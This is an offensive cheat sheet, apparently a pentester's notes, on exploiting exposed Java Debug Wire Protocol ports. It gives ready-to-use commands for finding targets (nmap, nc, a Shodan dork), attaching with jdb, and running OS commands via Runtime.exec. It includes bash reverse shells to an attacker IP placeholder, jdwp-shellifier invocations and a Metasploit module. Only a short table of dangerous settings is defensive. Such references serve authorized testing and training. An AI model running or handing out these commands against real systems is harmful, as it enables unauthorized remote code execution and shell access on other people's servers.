#JDWP #JavaDebugWireProtocol #Java #RCE #webservices

## What is JDWP?
Java Debug Wire Protocol — protocol used by Java debuggers to communicate with a running JVM. When a JVM is started with `-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<port>`, it listens for debugger connections. Requires no authentication by default. Any connected debugger has full control over the JVM — arbitrary code execution.

- Port: **TCP 8000** (common default), **TCP 5005**, **TCP 5050** — varies by config
- Authentication: **none by default** (any host can connect)
- Java startup flag: `-agentlib:jdwp=...` or `-Xdebug -Xrunjdwp:...`

---

## Enumeration

```bash
# Nmap
nmap -p 8000,5005,5050 --script banner -sV <target>
nmap -p 8000 -sV <target>   # JDWP identified by banner "JDWP-Handshake"

# Manual check — send JDWP handshake
echo "JDWP-Handshake" | nc -w 2 <target> 8000

# Shodan dork (recon): port:8000 "JDWP-Handshake"
```

---

## Connect / Access

```bash
# jdb (Java Debugger — built into JDK)
jdb -connect com.sun.jdi.SocketAttach:hostname=<target>,port=8000

# If remote — via SSH tunnel
ssh -L 8000:127.0.0.1:8000 <user>@<target> -N
jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8000

# jdb commands once connected:
# (jdb) version                   -- JVM version
# (jdb) classes                   -- list loaded classes
# (jdb) methods java.lang.Runtime -- list Runtime methods
# (jdb) run                       -- resume execution
```

---

## Attack Vectors

### RCE via Runtime.exec (jdb)

```bash
# Connect to JDWP
jdb -connect com.sun.jdi.SocketAttach:hostname=<target>,port=8000

# Once connected — execute OS command
# (jdb) 
print new java.lang.String(java.lang.Runtime.getRuntime().exec(new String[]{"id"}).getInputStream().readAllBytes())

# Reverse shell
print new java.lang.String(java.lang.Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"}).getInputStream().readAllBytes())

# Windows
print new java.lang.String(java.lang.Runtime.getRuntime().exec(new String[]{"cmd.exe","/c","whoami"}).getInputStream().readAllBytes())
```

### Automated Exploitation (jdwp-shellifier)

```bash
# https://github.com/IOActive/jdwp-shellifier
python2 jdwp-shellifier.py -t <target> -p 8000 --break-on "java.net.ServerSocket.accept" --cmd "id"
python2 jdwp-shellifier.py -t <target> -p 8000 --break-on "java.lang.String.indexOf" --cmd "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'"
```

### Metasploit

```bash
use exploit/multi/misc/java_jdwp_debugger
set RHOSTS <target>
set RPORT 8000
set LHOST <attacker_ip>
run
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| JDWP listening on `0.0.0.0` | RCE from any host |
| No authentication | Any debugger gets full JVM control |
| Production server with debug enabled | Code execution as app user (often root/service account) |
| Default port exposed | Easy discovery |

---

## Quick Reference

| Goal | Command |
|---|---|
| Detect | `echo "JDWP-Handshake" \| nc -w 2 host 8000` |
| Nmap | `nmap -p 8000 -sV host` |
| Connect (jdb) | `jdb -connect com.sun.jdi.SocketAttach:hostname=host,port=8000` |
| RCE (jdb) | `print new java.lang.String(Runtime.getRuntime().exec("id").getInputStream().readAllBytes())` |
| Automated | `python2 jdwp-shellifier.py -t host -p 8000 --cmd "id"` |
| MSF | `exploit/multi/misc/java_jdwp_debugger` |
